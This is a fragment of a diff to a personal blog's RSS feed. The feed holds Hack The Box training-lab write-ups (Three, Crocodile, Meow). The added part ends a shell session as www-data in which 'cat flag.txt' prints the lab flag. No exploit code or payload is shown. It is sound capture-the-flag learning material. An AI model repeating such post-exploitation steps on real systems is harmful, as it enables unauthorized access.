+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>www-data@three:/var/www$ cat flag.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>cat flag.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>a980d99281a28d638ac68b9bf9453c2b
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>www-data@three:/var/www$</span></span></code></pre></div>
+<br>
+<p><img src="image-8.png#center" alt="alt text"></p>
+]]></content:encoded>
+    </item>
     <item>
       <title>[HTB] Crocodile</title>
       <link>http://localhost:1313/htb-crocodile/</link>
@@ -7889,14 +8245,6 @@ Terminal TASK 3 What service do we use to form our VPN connection into HTB labs?
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>root@Meow:~#</span></span></code></pre></div>
 <p><img src="./htb_meow.png" alt="meow_clear"></p>
 ]]></content:encoded>
-    </item>
-    <item>
-      <title></title>
-      <link>http://localhost:1313/htb-three/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-three/</guid>
-      <description></description>
-      <content:encoded><![CDATA[]]></content:encoded>
     </item>
     <item>
       <title>Photos</title>
